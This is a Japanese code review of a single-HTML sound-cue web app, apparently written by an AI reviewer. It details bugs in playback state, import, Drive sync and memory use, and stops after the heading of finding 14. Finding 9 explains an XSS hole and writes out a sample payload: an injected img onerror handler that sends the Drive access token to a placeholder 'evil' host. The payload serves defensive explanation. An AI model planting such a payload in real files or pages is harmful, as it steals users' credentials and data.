# コードレビュー結果 — Session Sound Operator

> レビュー依頼書: Notion「コードレビュー依頼書（Session Sound Operator / Session 9時点）」
> レビュー者: Claude（シニアエンジニア視点） / 日付: 2026-07-31

## 0. 対象と読み方

| 項目 | 内容 |
| --- | --- |
| 対象ファイル | `sound.html`（2,963行 / 157,306 bytes）、`README.md`（146行） |
| **実際にレビューしたコミット** | **`dc39e58`（現在の main / blob `f77864d…`）** |
| 依頼書の指定コミット | `18f0788` + README `b7ef31e`（Session 9 検収時点） |
| 差分について | 依頼書の指定後に main が2コミット進んでいます（`396bfbd` 「音量を編集」トグル削除・タグ表示、`dc39e58` README追従）。**行番号はすべて `dc39e58` 基準**です。指摘内容自体は `18f0788` にもすべて当てはまります（該当コードは変更されていません）。 |
| 変更 | **`sound.html` は一切変更していません**（本ファイルの追加のみ） |

読み方の注意:

- **重大度**は依頼書の定義に従いました。🔴 = 演奏中に音が止まる／データが消える／復帰できない、🟡 = 警告、🔵 = 提案。
- 「発生確率は低いが被害が大きい」ものは 🔴 に置き、その旨を明記しています（例: 指摘9）。
- 修正案は**実装おすすめ順**です。理由は非エンジニアにも読める言葉で書きました。
- 単一HTML・ビルド無し・依存ライブラリ無しという構成は**変更提案していません**。すべて現構成のまま直せる内容です。

---

# 依頼書「2. レビュー観点（汎用）」13項目への対応表

どの観点をどの指摘で扱ったかの一覧です（詳細は各指摘、アプリ特化の観点は後半の「3-x への個別回答」を参照）。

| # | 観点 | 結果 | 該当指摘 |
| --- | --- | --- | --- |
| 1 | バグ・論理エラー | 🔴 5件・🟡 4件 | 1, 8, 14, 16, 25 / 10, 11, 15, 22 |
| 2 | セキュリティ | 🔴 1件・🟡 1件 | 9, 22, 32（詳細は 3-7） |
| 3 | パフォーマンス | 🟡 3件 | 13, 23, 24（+ 27, 28） |
| 4 | 可読性・命名規則 | 🔵 3件 | 29, 30, 36 |
| 5 | エラーハンドリング | 🔴 3件・🟡 2件 | 4, 7, 18 / 19, 21 |
| 6 | 時間計算量（Big-O） | 🔵 1件 | 27（O(n²) 経路3つ。現規模では許容） |
| 7 | 不要なループ・再計算 | 🟡 2件 | 24（毎入力の全シーンソート）, 13（毎入力の全DOM再構築） |
| 8 | メモリ使用量 | 🔴 1件・🟡 2件 | 6 / 10, 17 |
| 9 | 永続化層の通信効率（N+1相当） | 🟡 1件 | 20（音源の直列アップロード・pageSize上限・削除未反映。IndexedDB側は1トランザクション1操作で無駄な往復なし） |
| 10 | キャッシュ活用の余地 | 🟡 1件・🔵 1件 | 12（NEXTの先読み）, 6（LRU破棄）/ 27（ID索引） |
| 11 | 「なぜ動くか」分かりにくい箇所 | 🔵 1件（5か所） | 36 |
| 12 | 動かない可能性のある環境 | 🔴 1件・🟡 2件 | 7（file://・プライベート）/ 3-9 の iOS中断・OBS |
| 13 | README と実装の食い違い | 🟡 1件（3項目） | 26 |

---

# 🔴 致命的（9件）

> この節の指摘はすべて **重大度 🔴**（演奏中に音が止まる／データが消える／復帰できない）です。

## 1. 「シーン停止」中に ALL STOP／全停止を押すと、シーンの音量が復元できなくなる

**該当箇所**: `allStop()` L1063–1082 / `panicStop()` L1101–1127 / `toggleScenePause()` L1148–1175

**要約**: シーン停止のスナップショット（`live.scenePaused`）を、ALL STOP と全停止が**中身を引き継がずに捨てて**います。結果、「再生中と表示されているのに音が一切出ない」状態になり、GOし直すまで戻せません。

**問題が起きる条件と結果**:

1. シーンを再生 → **■ シーン停止** を押す。このとき `live.currentValues` は空になり（L1170）、本当の音量は `live.scenePaused` に退避されます。`live.currentSceneId` は残ったままです（L1168、意図的）。
2. そのまま **■ ALL STOP**（またはSpace）を押す。`allStop()` は「`live.currentSceneId` があるから再生中だ」と判断して（L1065）、**空になった `currentValues` をスナップショットとして保存**します（L1069）。さらに L1077 で `live.scenePaused=null` にして、本物の音量が入っていた退避データを捨てます。
3. **▶ ALL START** を押す。`currentSceneId` は戻りますが `currentValues` は空なので `startNeededChannels({})` は何も再生しません（L1091）。
4. 画面は「再生中: 3 戦闘！」と表示、シーン停止の注記も消えているのに**完全に無音**。シーン停止ボタンも `disabled`（L1461）になり、押せる復帰手段がありません。GO でシーンに入り直すしかありません。

**全停止でも同じことが起きます**。`panicStop()` は `live.allStopped` を入れ子で保存していますが（L1112）、`live.scenePaused` は保存せずに null にします（L1120）。つまり「シーン停止 → 全停止 → 全復帰」で音量が消えます。依頼書 3-3 の「復元できずに消える状態が無いか」への答えは **ある** です。

**修正案（おすすめ順）**:

1. **停止系の入れ子を1か所にまとめる（推奨）**
   停止ボタンごとに別の変数を持つのをやめ、「復帰用スナップショット」を1つの配列（スタック）にします。押すたびに積み、戻すたびに1枚めくる形です。
   ```js
   /* 例: live.snapshots = [] に {kind:'scenePause'|'allStop'|'panic', ...} を積む */
   function snapshotNow(kind){ return {kind,
     currentSceneId:live.currentSceneId, currentValues:{...live.currentValues},
     currentLoops:{...live.currentLoops}, interrupt:{...live.interrupt},
     se:[...sePlaying].map(s=>s.__se).filter(Boolean).map(m=>({...m})),
     intStopped:[...intStopped.entries()].map(([id,v])=>[id,{...v}]) }; }
   ```
   *なぜ一番おすすめか*: 過去に何度も起きている「スナップショットの潰し合い」を根本から無くせます。ボタンが4つでも5つでも、同じ入れ物に積むだけなので、新しい停止ボタンを足しても壊れません。
2. **最小修正: 退避データを引き継ぐ**
   `allStop()` / `panicStop()` の冒頭で、シーン停止中だったら「停止前の本当の値」を使ってスナップショットを作る。
   ```js
   const paused=live.scenePaused;              // シーン停止中なら本物の値はこちら
   const baseValues=paused?paused.currentValues:live.currentValues;
   const baseLoops =paused?paused.currentLoops :live.currentLoops;
   const baseSceneId=paused?paused.currentSceneId:live.currentSceneId;
   ```
   *なぜ2番目か*: 数行で今日のバグは止まりますが、停止系を足すたびに同じ見落としが起こりえます。
3. **最低限のガード: シーン停止中は他の停止ボタンを無効化**
   `renderSceneActions()` で `live.scenePaused` があるとき ALL STOP / 全停止 を `disabled` にする。
   *なぜ3番目か*: バグは踏まなくなりますが、「シーン停止中に全部止めたい」という自然な操作ができなくなります。

---

## 2. MUTE ALL を解除しても SE が戻らない（ループSEが消える）

**該当箇所**: `toggleMuteAll()` L1178–1201（特に L1193 のスナップショットと L1198 の `stopAllSE()`）

**要約**: MUTE ALL は SE（ポン出し・シーン登録SE）を**止めるだけで記録していません**。解除しても SE は戻らず、シーンのループSE（環境音など）は再生しなおす手段がありません。ツールチップと README は「同じ状態に戻ります」と書いており、説明と挙動が食い違っています。

**問題が起きる条件と結果**:

1. シーンにループSE（雨音など）を登録して再生、ポン出しも1つ鳴らしておく。
2. **MUTE ALL** を押す。L1193 のスナップショットは `currentValues` と `interrupt` だけ。L1198 で `stopAllSE()` が全SEを止めます。
3. **MUTE 解除** を押す。BGMと割込は戻りますが（L1182–1189）、**SEは1つも戻りません**。
4. ループSEを戻すには、そのシーンにもう一度入る（GOを一周する）か、シーン停止→再開するしかありません。演奏中にこれは致命的です。

**修正案（おすすめ順）**:

1. **MUTE ALL を「音量だけ落とす」実装に変える（推奨）**
   いま MUTE ALL は音源を全部停止していますが、名前どおり**マスターの音量を0にする**だけにします。
   ```js
   /* 例: engine.master.gain を 0 にして、解除時に戻すだけ */
   function toggleMuteAll(){
     if(live.muted){ setGainSmooth(engine.master.gain, live.muted.masterAll/1000); live.muted=null; }
     else { live.muted={masterAll:state.settings.masterAll}; setGainSmooth(engine.master.gain,0); }
     renderPerform();
   }
   ```
   *なぜ一番おすすめか*: 再生を止めないので「元に戻す」情報が要りません。**復元漏れが構造的に起こらなくなり**、しかも解除した瞬間に曲の続きから鳴るので、演奏の流れが切れません（今は先頭から鳴り直します）。「全部本当に止める」役は既に **■ 全停止** が担っているので、役割分担もきれいになります。
2. **SEもスナップショットに含める**
   `panicStop()` と同じように `se:[...sePlaying].map(s=>s.__se)` を保存し、解除時に `playSE` で鳴らし直す。
   *なぜ2番目か*: 今の作りのままで直せますが、SEは必ず「先頭から」になるため、長い環境音では違和感が残ります。
3. **説明を実装に合わせる**（応急処置）
   ツールチップと README から「同じ状態に戻ります」を削り、「SEは戻りません」と明記する。
   *なぜ3番目か*: 事故は減りますが、使いにくさは残ります。

---

## 3. インポートが「検証前に全削除」なので、失敗すると音源が全部消える

**該当箇所**: `#packInput` の change ハンドラ L2635–2653（特に L2641–2644）

**要約**: `.ssopack.json` を読み込むと、**中身を検証する前に端末内の音源データを全部消してから**書き戻します。途中で失敗すると、元のデータも新しいデータも無い状態になります。依頼書 3-6 の「ここは要確認」への答えは **要修正** です。

**問題が起きる条件と結果**:

```js
allStop();engine.buffers.clear();
for(const k of await blobKeys())await blobDel(k);   // ← ここで既存音源が全削除
state=migrate(pack.state);
for(const[id,b]of Object.entries(pack.blobs||{}))await blobPut(id,b64ToBlob(b.b64,b.type));  // ← ここで失敗しうる
```

- `pack.blobs` が壊れている（Base64が不正）と `atob` が例外を投げます。**削除済みなので元に戻せません**。catch は `alert('インポートに失敗しました')` を出すだけで、復旧しません（L2652）。
- `pack.blobs` が**丸ごと無い**ファイル（メタデータだけのJSON）でも、チェックは `pack.app` の一致だけ（L2639）なので通ります。結果、音源リストは残るのに実体が全部消え、再生しようとするたび「音源データがありません」（L876）になります。
- 途中でストレージ容量が足りなくなった場合も同じです。
- 確認ダイアログ（L2640）は「置き換えますか？」だけで、**元データが消えることは伝えていません**。

**修正案（おすすめ順）**:

1. **先に全部検証 → 新データを書き込み → 最後に古いものを消す（推奨）**
   ```js
   const pack=JSON.parse(await f.text());
   if(pack.app!=='session-sound-operator')throw new Error('このアプリのファイルではありません');
   const next=migrate(pack.state);                       // 先に状態を作る（この時点では保存しない）
   const decoded=[];                                     // 先に全Base64をデコードして検証
   for(const[id,b]of Object.entries(pack.blobs||{}))decoded.push([id,b64ToBlob(b.b64,b.type)]);
   if(next.audios.length&&!decoded.length&&!confirm('音源データが入っていません。メタデータだけ取り込みますか？'))return;
   for(const[id,blob]of decoded)await blobPut(id,blob);   // 書き込み（既存は上書き）
   const keep=new Set(decoded.map(([id])=>id));
   for(const k of await blobKeys())if(!keep.has(k))await blobDel(k);  // 最後に不要分だけ削除
   ```
   *なぜ一番おすすめか*: **失敗した時点では何も壊れていない**状態を保てます。「取り込めなかったので何も変更しませんでした」と言える形になります。
2. **インポート前に自動バックアップを取る**
   インポート直前に現在の状態を `.ssopack.json` として自動ダウンロード（またはIndexedDBの別キーに退避）する。
   *なぜ2番目か*: 1と併用すると安心ですが、単体では「壊れたあとに戻せる」だけで、壊れること自体は防げません。
3. **確認ダイアログの文言を強くする**
   「現在の端末のデータ（音源 N 件・シーン M 件）は削除されます。よろしいですか？」と件数を出す。
   *なぜ3番目か*: 誤操作は減りますが、失敗時のデータ喪失は防げません。

---

## 4. Drive のアップロード失敗が黙って捨てられ、バッジは「Drive同期中」のまま

**該当箇所**: `drive.upload()` L2728–2738 / `scheduleStateUpload()` L2777–2783 / `drive.api()` L2704–2710

**要約**: 自動アップロードの失敗を `catch(e){}`（**空**）で握り潰しています。トークン切れ後も画面は「Drive同期中」のままなので、**同期されていないことに気づけません**。

**問題が起きる条件と結果**:

- `drive.upload()` は `drive.api()` を通さず**生の `fetch`** を使っています（L2735）。そのため 401（トークン期限切れ）でも `drive.api()` の401処理（L2707: `connected=false` にしてバッジを更新）が走らず、`throw new Error('upload failed 401')` になります。
- その例外を受けるのは `scheduleStateUpload()` の `catch(e){}`（L2781）。**ログにも出ません**。
- Googleのアクセストークンは既定で約1時間で切れます。TRPGは3〜6時間続く前提なので、**セッション中に必ず切れます**。切れた後の編集は Drive に届きませんが、バッジは緑の「Drive同期中」、ログにも何も出ません。端末が壊れた／別端末で開いた時点で初めて「保存されていなかった」と分かります。
- 音源アップロード（L2784–2789）は失敗をログに出しますが**リトライしません**。state.json 側には音源が存在することになっているので、別端末では「音源データがありません」になります。

**修正案（おすすめ順）**:

1. **アップロードも `drive.api()` を通し、失敗を必ず表に出す（推奨）**
   ```js
   async upload(name,blob){ /* …略… */
     const r=await fetch(url,{method:id?'PATCH':'POST',headers:{Authorization:'Bearer '+drive.token},body:fd});
     if(r.status===401){drive.connected=false;drive.setBadge();drive.log('トークン期限切れ。再接続してください');throw new Error('unauthorized');}
     if(!r.ok)throw new Error('upload failed '+r.status);
   ```
   さらに `scheduleStateUpload` の catch を `catch(e){drive.log('自動保存に失敗: '+e.message);drive.setBadge();}` にし、**バッジに「未同期」状態を足す**（例: 黄色で「Drive 未同期」）。
   *なぜ一番おすすめか*: 「同期できていない」ことが**その場で分かる**ようになります。データ保護は「壊さない」より「気づける」ことが先です。
2. **失敗時の自動リトライ（指数バックオフ）と未送信キュー**
   `drive.pendingAudio`（L2670 に定義済みですが**現在まったく使われていません**）を実際に使い、失敗した名前を積んで次回同期時に再送する。
   *なぜ2番目か*: 効果は大きいですが、1が無いと「静かに失敗し続ける」ままです。
3. **トークンの自動更新**
   期限が近づいたら `tc.requestAccessToken({prompt:''})` を呼び直す（GISのサイレント更新）。
   *なぜ3番目か*: 便利ですが、ポップアップブロックの兼ね合いがあり、まずは1・2で「気づける・貯める」を作るのが確実です。

---

## 5. Drive 同期が `updatedAt` 比較だけで上書きするため、別端末の変更が消える

**該当箇所**: `drive.sync()` L2744–2761

**要約**: 「リモートが新しければ取り込む、そうでなければ**ローカルを丸ごとアップロード**」の2択です。マージも競合検出も無いため、後から接続した端末が先の端末の変更を**上書きして消します**。

**問題が起きる条件と結果**:

- 端末Aで編集（`updatedAt` = 10:00）→ Driveにアップ。端末Bを開くと `state.updatedAt` は前回の 9:30。リモート（10:00）が新しいので取り込み ✅。ここは正常です。
- ところが端末Bが**オフラインのまま編集**して 10:05 になり、その後に端末Aがさらに編集して 10:10 でアップ。次に端末Bが接続すると、リモート 10:10 > ローカル 10:05 なので**端末Bの編集が消えます**（取り込みで丸ごと置き換え、L2755）。逆の順番なら端末Aの変更が消えます。
- `updatedAt` は各端末の**PCの時計**（`Date.now()`、L814）です。時計がずれていると、新しい変更が「古い」と判定されて捨てられます。
- 取り込み前の退避もありません。消えたデータを戻す手段がありません。

**修正案（おすすめ順）**:

1. **上書きする前に必ず退避を作る（推奨・小さい）**
   取り込み（L2755）とアップロード（L2759）の直前に、負ける側のデータを `state_backup_<日時>.json` として Drive に置く（または IndexedDB に `stateBackup` として持つ）。
   ```js
   if(remote&&(remote.updatedAt||0)>(state.updatedAt||0)){
     await drive.upload('state_local_backup.json',new Blob([JSON.stringify(state)],{type:'application/json'}));
     state=migrate(remote); …
   ```
   *なぜ一番おすすめか*: 数行で「消えて戻せない」が「戻せる」に変わります。ライブツールに一番効く保険です。
2. **世代番号（リビジョン）で競合を検出して、人に選ばせる**
   `state.rev` を1つずつ増やし、`remote.rev` が「自分が最後に見た rev」と違ったら**両者の件数を出して確認ダイアログ**を出す。
   ```js
   // 例: 「Drive側: シーン12件（10:10更新） / この端末: シーン9件（10:05更新）。どちらを残しますか？」
   ```
   *なぜ2番目か*: 事故を根本から防げますが、UIの追加が必要です。
3. **時計依存をやめて Drive の `modifiedTime` を使う**
   `listFiles()` は既に `modifiedTime` を取得しています（L2724）。端末の時計より信頼できます。
   *なぜ3番目か*: 判定は正確になりますが、「どちらかが消える」構造自体は残ります。

---

## 6. デコード済みバッファを溜め続ける設計で、実運用のBGMではメモリが足りなくなる

**該当箇所**: `engine.buffers` L856 / `getBuffer()` L871–882 / `prewarmBuffers()` L922–929 / `importFiles()` L2412

**要約**: デコード後の音声は**圧縮前のPCM**なので極端に大きく（ステレオ44.1kHzで**1分あたり約21MB**）、`engine.buffers` は一度入れたら**何も捨てません**。さらに `prewarmBuffers()` は SE全件＋フェーダー割当BGM全件を**起動直後に全部デコード**します。

**問題が起きる条件と結果**:

- 5分のBGMは 5×21MB ≒ **105MB**（ファイルが5MBのmp3でも、デコード後はこの大きさです）。
- フェーダー割当を12本入れた実運用構成（各5分）だと、prewarm だけで **約1.2GB**。デモ音源は8秒なので問題が見えません（8秒 ≒ 2.8MB）。
- 到達点はブラウザによります。**iPad/iPhone の Safari は数百MB〜1GB程度でタブが落ちます**（落ちれば演奏が止まり、未保存の編集も失われます）。PCのChromeでも、他のタブと合わせてスワップが始まると音が途切れます。
- `importFiles()` も取り込んだ全ファイルを `engine.buffers` に入れます（L2412）。200件取り込めばその全部が残ります。
- 依頼書 3-1 の「音源200件規模でのメモリ使用量と破棄戦略の必要性」への答えは **必要** です。

**修正案（おすすめ順）**:

1. **prewarm の対象を絞る（推奨・すぐできる）**
   「1押しで鳴る必要があるもの」だけにします。SEは短いので全件で問題ありませんが、**BGMは長いので prewarm から外し**、代わりに「NEXTに選ばれたシーンのBGM」と「割込フェーダーの先頭N本」だけ先読みします（指摘12とセットで効きます）。
   ```js
   const ids=[...new Set([...seAudios().map(a=>a.id),
     ...faderAudios().filter(a=>(a.duration||0)<=60).map(a=>a.id)])];  // 長尺BGMは除く
   ```
   *なぜ一番おすすめか*: 起動時のメモリを一気に下げられ、体感の速さ（ポン出しの即応）は落ちません。
2. **LRUで上限を決めて捨てる**
   `engine.buffers` を「合計サンプル秒数がN秒を超えたら、いま鳴っていない・最近使っていないものから捨てる」形にします。
   ```js
   function evictBuffers(maxSec=1800){                     // 例: 合計30分まで
     let total=0;const keep=new Set([...engine.channels.keys(),...seActive.keys()]);
     for(const[id,b]of [...engine.buffers].reverse()){     // 新しいものから数える
       total+=b.duration;
       if(total>maxSec&&!keep.has(id))engine.buffers.delete(id);
     }
   }
   ```
   *なぜ2番目か*: 効果は根本的ですが、「捨てた直後の1押しが遅れる」ことがあるため、1で減らしてからの方が安全です。
3. **長尺BGMは `<audio>` + `MediaElementAudioSourceNode` にする**
   BGMだけストリーミング再生に切り替えると、デコード済みPCMを持たずに済みます。
   *なぜ3番目か*: 効果は最大ですが、`ensureChannelNow()` の「同フレームで鳴る」保証やループ・オフセット再開の作りを見直す必要があり、影響範囲が広いです。

---

## 7. 起動時にDBが開けないと、画面が真っ白のまま何も言わずに固まる

**該当箇所**: `init()` L2949–2960（`db=await openDB()` に try/catch が無い）

**要約**: `openDB()` が失敗すると `init()` の Promise が拒否されるだけで、**画面には何も表示されず、エラーも出ません**。ユーザーには「壊れた」としか見えません。

**問題が起きる条件と結果**:

- `file://` で直接開いた場合、Chrome は IndexedDB を拒否します（Firefoxは可）。README には「Drive同期はhttpsが必要」とありますが、**`file://` ではアプリ自体が起動しない**ことは書かれていません。
- Safari のプライベートブラウズ、ブラウザの「サイトデータをブロック」設定、ストレージ枯渇でも同じです。
- どの場合も、シーンリストは空、ボタンは並んでいるのに押しても何も起きない、という状態になります。演奏直前にこれが起きると復旧手段が分かりません。
- あわせて、`init()` 以降の `kvPut`（保存）も全て失敗しますが、`markDirty()` の中も try/catch が無いため（L817–821）**「保存中…」のまま止まり**、失敗が伝わりません。

**修正案（おすすめ順）**:

1. **起動失敗を画面に出す（推奨）**
   ```js
   (async function init(){
     try{ db=await openDB(); }
     catch(e){
       document.body.insertAdjacentHTML('afterbegin',
         '<div style="padding:16px;background:#5a2020;color:#fff">'+
         'データ保存領域（IndexedDB）を開けませんでした。<br>'+
         '・ファイルを直接開いていませんか？（http/https で開いてください）<br>'+
         '・プライベートブラウズ／サイトデータのブロックが有効ではありませんか？<br>'+
         '詳細: '+e.message+'</div>');
       return;                       // 以降は初期化しない
     }
     …
   ```
   *なぜ一番おすすめか*: 原因と対処が分かるだけで、演奏直前の事故が「数十秒で復旧できる事故」に変わります。
2. **保存の失敗も表示する**
   `markDirty()` のタイマー内を try/catch し、失敗したら `#saveState` を「⚠ 保存できません」（赤）にする。
   *なぜ2番目か*: 静かに保存されない状態が一番危険なので、1の次に効きます。
3. **`navigator.storage.persist()` を要求する**
   起動時に一度呼ぶと、ブラウザがストレージ不足時にこのサイトのデータを消しにくくなります。
   ```js
   if(navigator.storage?.persist)navigator.storage.persist();
   ```
   *なぜ3番目か*: 予防としては有効ですが、ユーザーには見えない改善です。

---

## 8. 手動フェーダーの `await` 競合で、遷移が中途半端なまま固まる

**該当箇所**: `ui.xfader` の `onInput` L1496–1512 / `beginTransition()` L989–1000

**要約**: `onInput` は `async` で、`await beginTransition(...)` の**待っている間に別の操作が入ると**、待ち明けに `live.trans` が別物（または null）になっており、表示と音がずれたまま固まります。依頼書 3-2 の「await中の競合」への答えは **競合あり** です。

**問題が起きる条件と結果**:

```js
async onInput(v){
  if(live.trans&&live.trans.mode==='auto')return;
  if(!live.trans){ … const ok=await beginTransition('manual'); if(!ok){ui.xfader.set(0);return;} }
  live.trans.x=v/1000;              // ← await 明け。ここで live.trans が別物 or null の可能性
```

- **ケースA（音が中途半端に固まる）**: フェーダーを50%までドラッグ → `beginTransition` が音源のデコードを待っている間に、指を0%まで戻して離す。0%側の `onInput` は `live.trans` がまだ null なので早期 return します（L1501）。その後 await が明けて `live.trans.x=0.5` が入り、**画面のフェーダーは0%なのに音は2シーンの50:50**という状態で止まります。以後 GO を押すまで直りません。
- **ケースB（例外で無反応）**: 同じ待ち時間中に Enter（GO）が入ると `live.trans` が auto に差し替わり、await 明けの代入がその auto 遷移の進行度を書き換えます。`cancelTransition` が先に走っていた場合は `live.trans` が null で **`TypeError` になり、その操作が黙って捨てられます**（async関数なので画面にもコンソールにも何も出ません）。
- 発生しやすいのは「NEXTのBGMがまだデコードされていない初回操作」です（指摘6・12と同根）。

**修正案（おすすめ順）**:

1. **await 明けに必ず状態を再確認する（推奨・3行）**
   ```js
   const ok=await beginTransition('manual');
   if(!ok||!live.trans||live.trans.mode!=='manual'){ui.xfader.set(0);return;}
   if(ui.xfader.get()<=0){cancelTransition();return;}     // 待っている間に0%へ戻された
   ```
   *なぜ一番おすすめか*: 数行で「固まる」「無反応」の両方が消えます。副作用もありません。
2. **`onInput` を同期処理にして、準備は先に済ませる**
   NEXT を選んだ時点で `startNeededChannels` を済ませておけば（指摘12の先読み）、`onInput` の中で待つ必要がなくなります。
   *なぜ2番目か*: 一番きれいですが、先読みの実装が前提になります。
3. **フェーダー操作中は多重起動を1つに制限**
   `let beginning=false` のフラグで `beginTransition` の同時実行を1本に絞る。
   *なぜ3番目か*: 二重起動は防げますが、ケースA（0%に戻したのに音が残る）は1が必要です。

---

## 9. タグ文字列が `innerHTML` に直挿しされていて、悪意あるファイルからスクリプトが動く

**該当箇所**: `renderTagChips()` L2476

```js
$('#tagList').innerHTML=all.map(t=>`<option value="${t.replace(/"/g,'&quot;')}"></option>`).join('');
```

**要約**: ダブルクォートしかエスケープしていないため、`<` や `>` を含むタグで HTML から抜け出せます。**外部から受け取った `.ssopack.json`／Drive上の `state.json` を読み込むだけでスクリプトが実行**され、Drive のアクセストークン（`drive.token`, L2670）や全音源を持ち出せます。

**発生確率は低い（自分で作ったファイルしか読まない限り安全）ですが、被害が大きいため 🔴 に置きました。**

**問題が起きる条件と結果**:

- タグが `</option><img src=x onerror="fetch('https://evil/?t='+drive.token)">` のような文字列だと、`</option>` で閉じてから任意のタグを差し込めます。
- 到達経路: ①他人からもらった `.ssopack.json` をインポート（L2643 の `migrate` はタグを**中身検査せず** `Array.isArray` だけ見ています、L781）、②共有アカウントのDriveから `state.json` を取り込む（L2755）、③自分で `<` を含むタグを入力（この場合は自己被害のみ）。
- 実行されると、メモリ上の Drive トークン、IndexedDB の全音源、`state` の全内容が外部に送れます。

**修正案（おすすめ順）**:

1. **`innerHTML` をやめて DOM で組む（推奨・確実）**
   ```js
   const dl=$('#tagList');dl.textContent='';
   for(const t of all){const o=document.createElement('option');o.value=t;dl.appendChild(o);}
   ```
   *なぜ一番おすすめか*: 「文字を文字として扱う」ので、どんな文字列が来ても壊れません。他の箇所（シーン名・音源名）は既にこの方式（`textContent`）で正しく書けているので、統一にもなります。
2. **取り込み時に文字列を洗う**
   `migrate()` で `a.tags=a.tags.filter(t=>typeof t==='string').map(t=>t.replace(/[<>]/g,'').slice(0,40))`、名前・任意IDも同様に長さと文字種を制限する。
   *なぜ2番目か*: 他の表示箇所も一括で守れますが、根本は1です。
3. **CSP を入れて被害を小さくする**
   `<head>` に許可先を絞ったCSPを置く（下記 🔵 32）。
   *なぜ3番目か*: 万一動いても外部送信を防げますが、GISとDrive APIを許可する必要があるため単独では不十分です。

---

# 🟡 警告（17件）

> この節の指摘はすべて **重大度 🟡**（すぐ壊れはしないが、演奏品質・信頼性を損なう）です。

## 10. 非ループBGMが自然に鳴り終わると GainNode が残り続ける

**該当箇所**: `startChannel()` L884–895（特に L892 の `onended`）/ `stopChannel()` L930–934

**指摘**: ループしないBGMが終端まで再生されると `onended` で `ch.playing=false` にするだけで、**`gain.disconnect()` をせず `engine.channels` からも削除しません**。同じ音源をもう一度鳴らすと新しい GainNode が作られ、古いノードはグラフに繋がったまま残ります。1本あたりは小さいですが、3〜6時間のセッションで積み上がります（依頼書 3-1 のリーク確認への答え: **この経路だけリークします**。SE側（L1238–1242）と `stopChannel` は正しく disconnect しています）。

**修正案**:
1. `onended` で後片付けまでする（推奨）:
   ```js
   src.onended=()=>{ if(engine.channels.get(id)===ch){ try{gain.disconnect();}catch(e){} engine.channels.delete(id); } };
   ```
   *理由*: 1行の追加で、鳴り終わった音の痕跡が残らなくなります。
2. 定期的な掃除（`tick` の中で数秒おきに `playing===false` の channel を削除）。*理由*: 保険としては有効ですが、毎フレームの処理を増やすので1の方が素直です。

## 11. 音を止めるときにフェードが無く「プチッ」というノイズが出る経路がある

**該当箇所**: `stopChannel()` L930–934 / 割込の■停止 L1651–1672（L1663）/ `toggleMuteAll()` L1197 / `panicStop()` L1123 / `doGO()` のカット処理 L1051–1052

**指摘**: いずれも**鳴っている音量のまま即座に `stop()`／`setValueAtTime`** します。波形が途中で切れるため、音量が大きいほど「プチッ」が乗ります（依頼書 3-1 のノイズ確認への答え: **この5経路で出ます**。逆に `startChannel` は gain 0 から立ち上げるので無音から始まり、`applyMix` の `setTargetAtTime`（L883）も滑らかで問題ありません）。

**修正案**:
1. 停止用のヘルパーを1つ作って全経路で使う（推奨）:
   ```js
   function stopChannelSoft(id,fade=0.03){
     const ch=engine.channels.get(id);if(!ch||!ch.playing)return stopChannel(id);
     const t=engine.ctx.currentTime;
     ch.gain.gain.cancelScheduledValues(t);
     ch.gain.gain.setTargetAtTime(0,t,fade/3);
     const src=ch.src,g=ch.gain;ch.playing=false;engine.channels.delete(id);
     setTimeout(()=>{try{src.stop();}catch(e){}try{g.disconnect();}catch(e){}},fade*1000+40);
   }
   ```
   *理由*: 30ミリ秒（人の耳には一瞬）で0まで落としてから止めるので、聞こえ方は「即停止」のままノイズだけ消えます。
2. カットIN（L1052）も `setValueAtTime` の代わりに 5ms の `linearRampToValueAtTime` にする。*理由*: カットの鋭さは保ったままクリックが減ります。

## 12. NEXTシーンのBGMが先読みされないので、初回GOが数百ms〜数秒待たされる

**該当箇所**: `prewarmBuffers()` L922–929 / `beginTransition()` L999（`await startNeededChannels`）

**指摘**: 先読み対象は「SE全件＋フェーダー割当BGM」だけで、**シーンに登録されたBGMは含まれません**。そのため、あるシーンへ初めて GO したときに `beginTransition` の中でデコードを待ちます。5分のmp3で0.3〜1秒、モバイルではそれ以上かかることがあります。README の「操作した瞬間（待ち時間0）に音が鳴ります」はポン出し・割込には当てはまりますが、**シーン遷移の初回には当てはまりません**（実装との食い違い＝指摘26に含む）。

**修正案**:
1. NEXTが決まった時点で先読みする（推奨）:
   ```js
   function prewarmScene(id){const s=sceneById(id);if(!s)return;
     for(const k of Object.keys(s.values||{}))getBuffer(k).catch(()=>{});
     for(const k of Object.keys(s.seValues||{}))getBuffer(k).catch(()=>{});}
   /* live.nextSceneId を書き換えている箇所（L1420, L1821, L1016, L1395 など）から呼ぶ */
   ```
   *理由*: 「次に鳴るものだけ」を前もって用意するので、メモリを増やさずGOが即時になります。指摘6（メモリ）と両立します。
2. GO中はボタンを「準備中…」表示にする。*理由*: 待ち時間の理由が分かるだけでも事故は減りますが、待ち自体は残ります。

## 13. `renderPerform()` が呼ばれすぎていて、入力1文字ごとに全パネルを作り直している

**該当箇所**: `renderPerform()` L1490–1493 / `renderPicker` の `apply` L2009 / `commit()` L2304 / `renderInterruptFaders()` L1593–1636

**指摘**: 音源選択の「%」を1文字打つたび、マスター音量スライダーを1ピクセル動かすたびに `renderPerform()` が走り、**シーンリスト・ポン出しパッド・割込フェーダーのDOMを全部作り直します**（割込フェーダーは毎回 `VFader` と `ResizeObserver` を作り直し）。200件規模＋12本フェーダーでは1回あたり数〜十数ミリ秒かかり、入力が重くなります。さらに**ドラッグ中に作り直されると、掴んでいた要素が消えて操作が飛びます**。

**修正案**:
1. 用途別に描画を分ける（推奨）: 値だけ変わったときは `renderSceneActions()`＋`updateInterruptReadouts()` のみ呼ぶ。DOMを作り直すのは「音源が増減した」「割当が変わった」ときだけにする。*理由*: 体感が軽くなり、ドラッグ中の事故も消えます。
2. `renderPerform` を `requestAnimationFrame` で1フレーム1回にまとめる（コアレス）:
   ```js
   let rpQueued=false;
   function renderPerformSoon(){if(rpQueued)return;rpQueued=true;requestAnimationFrame(()=>{rpQueued=false;renderPerform();});}
   ```
   *理由*: 呼び出し箇所を変えずに回数を減らせます。1と併用が理想です。

## 14. 🎚️ダイアログの音量編集がシーンマスターを無視する（音量表示と実音がずれる）

**該当箇所**: `renderChanRows()` の `apply` L1846–1855（特に L1849）

